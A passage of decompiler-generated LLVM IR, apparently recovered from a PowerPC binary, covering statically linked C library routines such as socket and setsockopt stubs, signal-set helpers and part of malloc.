  %v0_1000ad2c = call i32 @__sys_sendto()
  store i32 %v0_1000ad2c, i32* @r29, align 4
  %v1_1000ad38 = call i32 @__libc_disable_asynccancel(i32 %v0_1000ad0c)
  %v0_1000ad40 = load i32, i32* @r29, align 4
  ret i32 %v0_1000ad40

; uselistorder directives
  uselistorder label %dec_label_pc_1000ad0c, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1000ad5c = call i32 @__asm_mfcr()
  %v1_1000ad60 = and i32 %v0_1000ad5c, 268435456
  %v3_1000ad60 = icmp eq i32 %v1_1000ad60, 0
  %v0_1000ad68 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ad60, i32 %v0_1000ad68)
  %v0_1000ad78 = load i32, i32* @r2, align 4
  %v1_1000ad7c = add i32 %v0_1000ad78, -28672
  %v2_1000ad80 = inttoptr i32 %v1_1000ad7c to i32*
  store i32 %v0_1000ad5c, i32* %v2_1000ad80, align 4
  ret i32 -1
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_1000ad90 = call i32 @__asm_mfcr()
  %v1_1000ad94 = and i32 %v0_1000ad90, 268435456
  %v3_1000ad94 = icmp eq i32 %v1_1000ad94, 0
  %v0_1000ad9c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ad94, i32 %v0_1000ad9c)
  %v0_1000adac = load i32, i32* @r2, align 4
  %v1_1000adb0 = add i32 %v0_1000adac, -28672
  %v2_1000adb4 = inttoptr i32 %v1_1000adb0 to i32*
  store i32 %v0_1000ad90, i32* %v2_1000adb4, align 4
  ret i32 -1
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  %tmp = icmp slt i32 %arg1, 1
  br i1 %tmp, label %dec_label_pc_1000add0, label %dec_label_pc_1000adc4

dec_label_pc_1000adc4:                            ; preds = %entry
  %v2_1000adc4 = icmp sgt i32 %arg1, 64
  br i1 %v2_1000adc4, label %dec_label_pc_1000add0, label %dec_label_pc_1000adcc

dec_label_pc_1000adcc:                            ; preds = %dec_label_pc_1000adc4
  %v0_1000adcc = call i32 @__sigaddset()
  br label %dec_label_pc_1000add0

dec_label_pc_1000add0:                            ; preds = %dec_label_pc_1000adc4, %entry, %dec_label_pc_1000adcc
  %v0_1000ade0 = load i32, i32* @r2, align 4
  %v1_1000ade4 = add i32 %v0_1000ade0, -28672
  %v2_1000ade8 = inttoptr i32 %v1_1000ade4 to i32*
  store i32 22, i32* %v2_1000ade8, align 4
  ret i32 -1

; uselistorder directives
  uselistorder label %dec_label_pc_1000add0, { 2, 0, 1 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000adf4 = add i32 %tmp, 4
  %v3_1000adf4 = inttoptr i32 %v2_1000adf4 to i32*
  store i32 0, i32* %v3_1000adf4, align 4
  %v0_1000adf8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000adf8, i32* %arg1, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_1000ae04 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ae04, label %dec_label_pc_1000ae34, label %dec_label_pc_1000ae24

dec_label_pc_1000ae24:                            ; preds = %entry
  %tmp10 = icmp slt i32 %arg1, 1
  br i1 %tmp10, label %dec_label_pc_1000ae34, label %dec_label_pc_1000ae2c

dec_label_pc_1000ae2c:                            ; preds = %dec_label_pc_1000ae24
  %tmp11 = icmp slt i32 %arg1, 65
  br i1 %tmp11, label %dec_label_pc_1000ae54, label %dec_label_pc_1000ae34

dec_label_pc_1000ae34:                            ; preds = %dec_label_pc_1000ae2c, %dec_label_pc_1000ae24, %entry
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1000ae44 = load i32, i32* @r2, align 4
  %v1_1000ae48 = add i32 %v0_1000ae44, -28672
  %v2_1000ae4c = inttoptr i32 %v1_1000ae48 to i32*
  store i32 22, i32* %v2_1000ae4c, align 4
  %v0_1000aec0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000aeb0

dec_label_pc_1000ae54:                            ; preds = %dec_label_pc_1000ae2c
  store i32 %arg1, i32* @r4, align 4
  %v2_1000ae5c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1000ae5c, i32* @r3, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v0_1000ae6c = call i32 @__sigaddset()
  %v0_1000ae74 = load i32, i32* %r31.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10021218.478 to i32), i32* %r3.global-to-local, align 4
  %v2_1000ae7c = call i32 @__GI___sigismember(i32 ptrtoint (i32* @global_var_10021218.478 to i32), i32 %v0_1000ae74)
  %v2_1000ae80 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000ae88 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v0_1000ae74, i32* %r3.global-to-local, align 4
  store i32 268480160, i32* @lr, align 4
  %v3_1000ae9c = call i32 @__libc_sigaction(i32 %v0_1000ae74, i32 %v2_1000ae80, i32 %v2_1000ae88)
  %v1_1000aea0 = icmp slt i32 %v3_1000ae9c, 0
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v1_1000aea0, label %dec_label_pc_1000aeb0, label %dec_label_pc_1000aeac

dec_label_pc_1000aeac:                            ; preds = %dec_label_pc_1000ae54
  %v3_1000aeac = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1000aeac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000aeb0

dec_label_pc_1000aeb0:                            ; preds = %dec_label_pc_1000ae54, %dec_label_pc_1000ae34, %dec_label_pc_1000aeac
  %v0_1000aec0 = phi i32 [ -1, %dec_label_pc_1000ae54 ], [ %v0_1000aec0.pre, %dec_label_pc_1000ae34 ], [ %v3_1000aeac, %dec_label_pc_1000aeac ]
  ret i32 %v0_1000aec0

; uselistorder directives
  uselistorder i32 %v0_1000ae74, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_1000aeb0, { 2, 0, 1 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000aec4 = add i32 %arg2, -1
  %v1_1000aec8 = call i32 @__asm_rlwinm(i32 %v1_1000aec4, i32 29, i32 3, i32 29)
  %v1_1000aecc = urem i32 %v1_1000aec4, 32
  %v2_1000aed0 = add i32 %v1_1000aec8, %arg1
  %v3_1000aed0 = inttoptr i32 %v2_1000aed0 to i32*
  %v4_1000aed0 = load i32, i32* %v3_1000aed0, align 4
  %v3_1000aed8 = shl i32 1, %v1_1000aecc
  %v2_1000aedc = and i32 %v4_1000aed0, %v3_1000aed8
  %v2_1000aee0 = icmp ne i32 %v2_1000aedc, 0
  %v5_1000aee4 = zext i1 %v2_1000aee0 to i32
  ret i32 %v5_1000aee4
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000aeec = load i32, i32* @r4, align 4
  %v1_1000aeec = add i32 %v0_1000aeec, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000aef4 = call i32 @__asm_rlwinm(i32 %v1_1000aeec, i32 29, i32 3, i32 29)
  %v1_1000aef8 = urem i32 %v1_1000aeec, 32
  %v1_1000aefc = load i32, i32* @r3, align 4
  %v2_1000aefc = add i32 %v1_1000aefc, %v1_1000aef4
  %v3_1000aefc = inttoptr i32 %v2_1000aefc to i32*
  %v4_1000aefc = load i32, i32* %v3_1000aefc, align 4
  %v0_1000af00 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000af00 = shl i32 %v0_1000af00, %v1_1000aef8
  store i32 %v3_1000af00, i32* %r0.global-to-local, align 4
  %v2_1000af04 = or i32 %v3_1000af00, %v4_1000aefc
  store i32 %v2_1000af04, i32* %v3_1000aefc, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000af14 = add i32 %arg2, -1
  %v1_1000af1c = call i32 @__asm_rlwinm(i32 %v1_1000af14, i32 29, i32 3, i32 29)
  %v1_1000af20 = urem i32 %v1_1000af14, 32
  %v2_1000af24 = add i32 %v1_1000af1c, %arg1
  %v3_1000af24 = inttoptr i32 %v2_1000af24 to i32*
  %v4_1000af24 = load i32, i32* %v3_1000af24, align 4
  %v3_1000af28 = shl i32 -2, %v1_1000af20
  %v4_1000af28 = sub nsw i32 32, %v1_1000af20
  %v5_1000af28 = lshr i32 -2, %v4_1000af28
  %v6_1000af28 = or i32 %v5_1000af28, %v3_1000af28
  %v2_1000af2c = and i32 %v6_1000af28, %v4_1000af24
  store i32 %v2_1000af2c, i32* %v3_1000af24, align 4
  ret i32 0
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v1_1000af3c = udiv i32 %arg1, 256
  store i32 %v1_1000af3c, i32* %r11.global-to-local, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v2_1000af44 = icmp ugt i32 %arg1, 16777215
  %v0_1000af4c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000af44, i32 %v0_1000af4c)
  %v1_1000af50 = add nsw i32 %v1_1000af3c, -256
  %v1_1000af54 = call i32 @__asm_rlwinm(i32 %v1_1000af50, i32 16, i32 28, i32 28)
  %v0_1000af58 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000af58 = urem i32 %v1_1000af54, 64
  %v3_1000af58 = shl i32 %v0_1000af58, %v2_1000af58
  store i32 %v3_1000af58, i32* %r11.global-to-local, align 4
  %v1_1000af5c = sub i32 13, %v1_1000af54
  %v1_1000af60 = add i32 %v3_1000af58, -4096
  %v1_1000af64 = call i32 @__asm_rlwinm(i32 %v1_1000af60, i32 16, i32 29, i32 29)
  %v2_1000af68 = urem i32 %v1_1000af64, 64
  %v3_1000af68 = shl i32 %v3_1000af58, %v2_1000af68
  store i32 %v3_1000af68, i32* %r11.global-to-local, align 4
  %v2_1000af6c = sub i32 %v1_1000af5c, %v1_1000af64
  %v1_1000af70 = add i32 %v3_1000af68, -16384
  %v1_1000af74 = call i32 @__asm_rlwinm(i32 %v1_1000af70, i32 16, i32 30, i32 30)
  %v2_1000af78 = urem i32 %v1_1000af74, 64
  %v3_1000af78 = shl i32 %v3_1000af68, %v2_1000af78
  %v2_1000af7c = sub i32 %v2_1000af6c, %v1_1000af74
  %v1_1000af80 = udiv i32 %v3_1000af78, 32768
  %v1_1000af84 = udiv i32 %v3_1000af78, 16384
  store i32 %v1_1000af84, i32* @r11, align 4
  %v2_1000af88 = sub nuw nsw i32 -1, %v1_1000af80
  %v3_1000af88 = and i32 %v1_1000af84, %v2_1000af88
  %v2_1000af8c = add i32 %v3_1000af88, %v2_1000af7c
  %v1_1000af90 = add i32 %v2_1000af8c, 6
  %v1_1000af94 = mul i32 %v2_1000af8c, 4
  %v0_1000af98 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000af98 = urem i32 %v1_1000af90, 64
  %v3_1000af98 = lshr i32 %v0_1000af98, %v2_1000af98
  %v1_1000af9c = add i32 %v1_1000af94, 32
  %v1_1000afa0 = urem i32 %v3_1000af98, 4
  %v2_1000afa4 = or i32 %v1_1000afa0, %v1_1000af9c
  ret i32 %v2_1000afa4

; uselistorder directives
  uselistorder i32 %v1_1000af84, { 1, 0 }
  uselistorder i32 %v1_1000af74, { 1, 0 }
  uselistorder i32 %v1_1000af64, { 1, 0 }
  uselistorder i32 %v1_1000af54, { 1, 0 }
  uselistorder i32 13, { 14, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 1, 12, 13, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr7_gt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_1000afb0 = load i32, i32* @lr, align 4
  store i32 %v0_1000afb0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10021074.479 to i32), i32* @r29, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10021074.479 to i32), i32* %r5.global-to-local, align 4
  %v2_1000afd0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1000afd0, i32* %r3.global-to-local, align 4
  %v5_1000afd8 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-72, i32 ptrtoint ([3 x i8]* @global_var_1000d02c.473 to i32), i32 ptrtoint (i32* @global_var_10021074.479 to i32))
  %v0_1000afdc = load i32, i32* @r29, align 4
  store i32 %v0_1000afdc, i32* %r3.global-to-local, align 4
  %v1_1000afe0 = call i32 @__pthread_return_0(i32 %v0_1000afdc)
  store i32 %v1_1000afe0, i32* %r3.global-to-local, align 4
  store i32 -33, i32* %r0.global-to-local, align 4
  %v0_1000afe8 = load i32, i32* @r31, align 4
  %v3_1000afe8 = icmp ugt i32 %v0_1000afe8, -33
  store i1 %v3_1000afe8, i1* %cr7_gt.global-to-local, align 1
  %tmp75 = icmp ult i32 %v0_1000afe8, -32
  br i1 %tmp75, label %dec_label_pc_1000b010, label %dec_label_pc_1000aff0

dec_label_pc_1000aff0:                            ; preds = %entry
  store i32 12, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v0_1000b000 = load i32, i32* @r2, align 4
  %v1_1000b004 = add i32 %v0_1000b000, -28672
  store i32 %v1_1000b004, i32* @r9, align 4
  %v2_1000b008 = inttoptr i32 %v1_1000b004 to i32*
  store i32 12, i32* %v2_1000b008, align 4
  br label %dec_label_pc_1000b8a4

dec_label_pc_1000b010:                            ; preds = %entry
  %v1_1000b010 = add i32 %v0_1000afe8, 11
  store i32 %v1_1000b010, i32* %r3.global-to-local, align 4
  store i32 16, i32* @r26, align 4
  %v2_1000b018 = icmp ugt i32 %v1_1000b010, 15
  store i1 %v2_1000b018, i1* %cr7_gt.global-to-local, align 1
  %tmp76 = icmp ult i32 %v1_1000b010, 16
  br i1 %tmp76, label %dec_label_pc_1000b024, label %dec_label_pc_1000b020

dec_label_pc_1000b020:                            ; preds = %dec_label_pc_1000b010
  %v1_1000b020 = call i32 @__asm_rlwinm(i32 %v1_1000b010, i32 0, i32 0, i32 28)
  store i32 %v1_1000b020, i32* @r26, align 4
  br label %dec_label_pc_1000b024

dec_label_pc_1000b024:                            ; preds = %dec_label_pc_1000b010, %dec_label_pc_1000b020
  %v0_1000b0c0 = phi i32 [ 16, %dec_label_pc_1000b010 ], [ %v1_1000b020, %dec_label_pc_1000b020 ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000b028 = load i32, i32* @global_var_10023a2c.481, align 4
  store i32 %v3_1000b028, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r3, align 4
  %v1_1000b030 = urem i32 %v3_1000b028, 2
  store i32 %v1_1000b030, i32* %r0.global-to-local, align 4
  %v3_1000b030 = icmp eq i32 %v1_1000b030, 0
  store i1 %v3_1000b030, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b030, label %dec_label_pc_1000b038, label %dec_label_pc_1000b048

dec_label_pc_1000b038:                            ; preds = %dec_label_pc_1000b024
  %v2_1000b038 = icmp sgt i32 %v3_1000b028, 0
  %v3_1000b038 = icmp eq i32 %v3_1000b028, 0
  store i1 %v2_1000b038, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b038, label %dec_label_pc_1000b040, label %dec_label_pc_1000b430

dec_label_pc_1000b040:                            ; preds = %dec_label_pc_1000b038
  store i32 ptrtoint (i32* @global_var_1000b044.482 to i32), i32* @lr, align 4
  %v0_1000b040 = call i32 @__malloc_consolidate()
  store i32 %v0_1000b040, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b430

dec_label_pc_1000b048:                            ; preds = %dec_label_pc_1000b024
  %v3_1000b048 = icmp ugt i32 %v0_1000b0c0, %v3_1000b028
  store i1 %v3_1000b048, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b048, label %dec_label_pc_1000b074, label %dec_label_pc_1000b050

dec_label_pc_1000b050:                            ; preds = %dec_label_pc_1000b048
  store i32 ptrtoint (i32* @global_var_10023a28.467 to i32), i32* %r9.global-to-local, align 4
  %v1_1000b054 = udiv i32 %v0_1000b0c0, 2
  store i32 %v1_1000b054, i32* @r11, align 4
  %v2_1000b058 = add i32 %v1_1000b054, ptrtoint (i32* @global_var_10023a28.467 to i32)
  %v3_1000b058 = inttoptr i32 %v2_1000b058 to i32*
  %v4_1000b058 = load i32, i32* %v3_1000b058, align 4
  store i32 %v4_1000b058, i32* %r3.global-to-local, align 4
  %v2_1000b05c = icmp sgt i32 %v4_1000b058, 0
  %v3_1000b05c = icmp eq i32 %v4_1000b058, 0
  store i1 %v2_1000b05c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b05c, label %dec_label_pc_1000b074, label %dec_label_pc_1000b064

dec_label_pc_1000b064:                            ; preds = %dec_label_pc_1000b050
  %v1_1000b064 = add i32 %v4_1000b058, 8
  %v2_1000b064 = inttoptr i32 %v1_1000b064 to i32*
  %v3_1000b064 = load i32, i32* %v2_1000b064, align 4
  store i32 %v3_1000b064, i32* %r0.global-to-local, align 4
  store i32 %v1_1000b064, i32* @r30, align 4
  store i32 %v3_1000b064, i32* %v3_1000b058, align 4
  br label %dec_label_pc_1000b898

dec_label_pc_1000b074:                            ; preds = %dec_label_pc_1000b050, %dec_label_pc_1000b048
  %v2_1000b074 = icmp ugt i32 %v0_1000b0c0, 255
  store i1 %v2_1000b074, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1000b074, label %dec_label_pc_1000b0c0, label %dec_label_pc_1000b07c

dec_label_pc_1000b07c:                            ; preds = %dec_label_pc_1000b074
  %v1_1000b080 = udiv i32 %v0_1000b0c0, 8
  store i32 %v1_1000b080, i32* @r28, align 4
  %v2_1000b088 = add i32 %v0_1000b0c0, ptrtoint (i32* @global_var_10023a60.483 to i32)
  store i32 %v2_1000b088, i32* %r9.global-to-local, align 4
  %v1_1000b08c = add i32 %v0_1000b0c0, add (i32 ptrtoint (i32* @global_var_10023a60.483 to i32), i32 -8)
  store i32 %v1_1000b08c, i32* @r8, align 4
  %v1_1000b090 = add i32 %v0_1000b0c0, add (i32 ptrtoint (i32* @global_var_10023a60.483 to i32), i32 4)
  %v2_1000b090 = inttoptr i32 %v1_1000b090 to i32*
  %v3_1000b090 = load i32, i32* %v2_1000b090, align 4
  store i32 %v3_1000b090, i32* %r3.global-to-local, align 4
  %v3_1000b094 = icmp sgt i32 %v3_1000b090, %v1_1000b08c
  %v4_1000b094 = icmp eq i32 %v3_1000b090, %v1_1000b08c
  store i1 %v3_1000b094, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b094, label %dec_label_pc_1000b218, label %dec_label_pc_1000b09c

dec_label_pc_1000b09c:                            ; preds = %dec_label_pc_1000b07c
  %v2_1000b09c = add i32 %v3_1000b090, %v0_1000b0c0
  store i32 %v2_1000b09c, i32* %r9.global-to-local, align 4
  %v1_1000b0a0 = add i32 %v3_1000b090, 12
  %v2_1000b0a0 = inttoptr i32 %v1_1000b0a0 to i32*
  %v3_1000b0a0 = load i32, i32* %v2_1000b0a0, align 4
  store i32 %v3_1000b0a0, i32* @r11, align 4
  %v1_1000b0a4 = add i32 %v2_1000b09c, 4
  %v2_1000b0a4 = inttoptr i32 %v1_1000b0a4 to i32*
  %v3_1000b0a4 = load i32, i32* %v2_1000b0a4, align 4
  store i32 %v3_1000b0a4, i32* %r0.global-to-local, align 4
  %v1_1000b0a8 = add i32 %v3_1000b090, 8
  store i32 %v1_1000b0a8, i32* @r30, align 4
  %v2_1000b0ac = add i32 %v3_1000b0a0, 8
  %v3_1000b0ac = inttoptr i32 %v2_1000b0ac to i32*
  store i32 %v1_1000b08c, i32* %v3_1000b0ac, align 4
  %v0_1000b0b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b0b0 = or i32 %v0_1000b0b0, 1
  store i32 %v1_1000b0b0, i32* %r0.global-to-local, align 4
  %v0_1000b0b4 = load i32, i32* @r11, align 4
  %v1_1000b0b4 = load i32, i32* @r8, align 4
  %v2_1000b0b4 = add i32 %v1_1000b0b4, 12
  %v3_1000b0b4 = inttoptr i32 %v2_1000b0b4 to i32*
  store i32 %v0_1000b0b4, i32* %v3_1000b0b4, align 4
  %v0_1000b0b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b0b8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b0b8 = add i32 %v1_1000b0b8, 4
  %v3_1000b0b8 = inttoptr i32 %v2_1000b0b8 to i32*
  store i32 %v0_1000b0b8, i32* %v3_1000b0b8, align 4
  br label %dec_label_pc_1000b898

dec_label_pc_1000b0c0:                            ; preds = %dec_label_pc_1000b074
  store i32 %v0_1000b0c0, i32* %r3.global-to-local, align 4
  store i32 268480712, i32* @lr, align 4
  %v1_1000b0c4 = call i32 @__malloc_largebin_index(i32 %v0_1000b0c0)
  store i32 %v1_1000b0c4, i32* %r3.global-to-local, align 4
  %v0_1000b0c8 = load i32, i32* @r31, align 4
  %v1_1000b0c8 = and i32 %v0_1000b0c8, 2
  store i32 %v1_1000b0c8, i32* %r0.global-to-local, align 4
  %v3_1000b0c8 = icmp eq i32 %v1_1000b0c8, 0
  store i1 %v3_1000b0c8, i1* %cr0_eq.global-to-local, align 1
  store i32 %v1_1000b0c4, i32* @r28, align 4
  br i1 %v3_1000b0c8, label %dec_label_pc_1000b218, label %dec_label_pc_1000b0d4

dec_label_pc_1000b0d4:                            ; preds = %dec_label_pc_1000b0c0
  store i32 ptrtoint (i32* @global_var_10023a2c.481 to i32), i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000b0e0.484 to i32), i32* @lr, align 4
  %v0_1000b0dc = call i32 @__malloc_consolidate()
  store i32 %v0_1000b0dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000b218

dec_label_pc_1000b0e4:                            ; preds = %dec_label_pc_1000b218, %dec_label_pc_1000b1e0
  %v3_1000b22c103 = phi i32 [ %v3_1000b22c, %dec_label_pc_1000b1e0 ], [ %v3_1000b22c98, %dec_label_pc_1000b218 ]
  %v1_1000b0e8 = add i32 %v3_1000b22c103, 4
  %v2_1000b0e8 = inttoptr i32 %v1_1000b0e8 to i32*
  %v3_1000b0e8 = load i32, i32* %v2_1000b0e8, align 4
  store i32 %v3_1000b0e8, i32* %r0.global-to-local, align 4
  %v1_1000b0ec = add i32 %v3_1000b22c103, 12
  %v2_1000b0ec = inttoptr i32 %v1_1000b0ec to i32*
  %v3_1000b0ec = load i32, i32* %v2_1000b0ec, align 4
  store i32 %v3_1000b0ec, i32* @r8, align 4
  %v1_1000b0f0 = call i32 @__asm_rlwinm(i32 %v3_1000b0e8, i32 0, i32 0, i32 29)
  store i32 %v1_1000b0f0, i32* @r29, align 4
  %v0_1000b0f4 = load i1, i1* %cr7_gt.global-to-local, align 1
  %v1_1000b150.pre = load i32, i32* @r8, align 4
  br i1 %v0_1000b0f4, label %dec_label_pc_1000b14c, label %dec_label_pc_1000b0f8

dec_label_pc_1000b0f8:                            ; preds = %dec_label_pc_1000b0e4
  %v1_1000b0f8 = load i32, i32* %r30.global-to-local, align 4
  %v3_1000b0f8 = icmp sgt i32 %v1_1000b150.pre, %v1_1000b0f8
  %v4_1000b0f8 = icmp eq i32 %v1_1000b150.pre, %v1_1000b0f8
  store i1 %v3_1000b0f8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b0f8, label %dec_label_pc_1000b100, label %dec_label_pc_1000b14c

dec_label_pc_1000b100:                            ; preds = %dec_label_pc_1000b0f8
  %v3_1000b100 = load i32, i32* @global_var_10023a5c.486, align 4
  store i32 %v3_1000b100, i32* %r0.global-to-local, align 4
  %v0_1000b104 = load i32, i32* @r31, align 4
  %v3_1000b104 = icmp sgt i32 %v0_1000b104, %v3_1000b100
  %v4_1000b104 = icmp eq i32 %v0_1000b104, %v3_1000b100
  store i1 %v3_1000b104, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1000b104, label %dec_label_pc_1000b10c, label %dec_label_pc_1000b14c

dec_label_pc_1000b10c:                            ; preds = %dec_label_pc_1000b100
  %v1_1000b10c = load i32, i32* @r24, align 4
  %v3_1000b10c = icmp ugt i32 %v1_1000b0f0, %v1_1000b10c
  store i1 %v3_1000b10c, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1000b10c, label %dec_label_pc_1000b114, label %dec_label_pc_1000b14c

dec_label_pc_1000b114:                            ; preds = %dec_label_pc_1000b10c
  %v0_1000b114 = load i32, i32* @r26, align 4
  %v2_1000b114 = sub i32 %v1_1000b0f0, %v0_1000b114
  store i32 %v2_1000b114, i32* @r11, align 4
  %v2_1000b118 = add i32 %v0_1000b114, %v3_1000b100
  store i32 %v2_1000b118, i32* %r9.global-to-local, align 4
  %v1_1000b11c = or i32 %v0_1000b114, 1
  store i32 %v1_1000b11c, i32* %r10.global-to-local, align 4
  %v1_1000b120 = or i32 %v2_1000b114, 1
  store i32 %v1_1000b120, i32* %r0.global-to-local, align 4
  %v1_1000b124 = add i32 %v3_1000b100, 8
  store i32 %v1_1000b124, i32* @r30, align 4
  %v2_1000b128 = add i32 %v1_1000b150.pre, 8
  %v3_1000b128 = inttoptr i32 %v2_1000b128 to i32*
  store i32 %v2_1000b118, i32* %v3_1000b128, align 4
  %v0_1000b12c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b12c = load i32, i32* @r8, align 4
  %v2_1000b12c = add i32 %v1_1000b12c, 12
  %v3_1000b12c = inttoptr i32 %v2_1000b12c to i32*
  store i32 %v0_1000b12c, i32* %v3_1000b12c, align 4
  %v0_1000b130 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b130 = load i32, i32* @r31, align 4
  %v2_1000b130 = add i32 %v1_1000b130, 4
  %v3_1000b130 = inttoptr i32 %v2_1000b130 to i32*
  store i32 %v0_1000b130, i32* %v3_1000b130, align 4
  %v0_1000b134 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000b134, i32* @global_var_10023a5c.486, align 4
  %v0_1000b138 = load i32, i32* @r11, align 4
  %v3_1000b138 = add i32 %v0_1000b138, %v0_1000b134
  %v4_1000b138 = inttoptr i32 %v3_1000b138 to i32*
  store i32 %v0_1000b138, i32* %v4_1000b138, align 4
  %v0_1000b13c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b13c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b13c = add i32 %v1_1000b13c, 4
  %v3_1000b13c = inttoptr i32 %v2_1000b13c to i32*
  store i32 %v0_1000b13c, i32* %v3_1000b13c, align 4
  %v0_1000b140 = load i32, i32* @r8, align 4
  %v1_1000b140 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b140 = add i32 %v1_1000b140, 12
  %v3_1000b140 = inttoptr i32 %v2_1000b140 to i32*
  store i32 %v0_1000b140, i32* %v3_1000b140, align 4
  %v0_1000b144 = load i32, i32* @r8, align 4
  %v1_1000b144 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b144 = add i32 %v1_1000b144, 8
  %v3_1000b144 = inttoptr i32 %v2_1000b144 to i32*
  store i32 %v0_1000b144, i32* %v3_1000b144, align 4
  br label %dec_label_pc_1000b898

dec_label_pc_1000b14c:                            ; preds = %dec_label_pc_1000b0e4, %dec_label_pc_1000b10c, %dec_label_pc_1000b100, %dec_label_pc_1000b0f8
  %v1_1000b14c = load i32, i32* @r26, align 4
  %v3_1000b14c = icmp sgt i32 %v1_1000b0f0, %v1_1000b14c
  %v4_1000b14c = icmp eq i32 %v1_1000b0f0, %v1_1000b14c
  store i1 %v3_1000b14c, i1* %cr7_gt.global-to-local, align 1
  %v2_1000b150 = add i32 %v1_1000b150.pre, 8
  %v3_1000b150 = inttoptr i32 %v2_1000b150 to i32*
  store i32 ptrtoint (i32* @global_var_10023a60.483 to i32), i32* %v3_1000b150, align 4
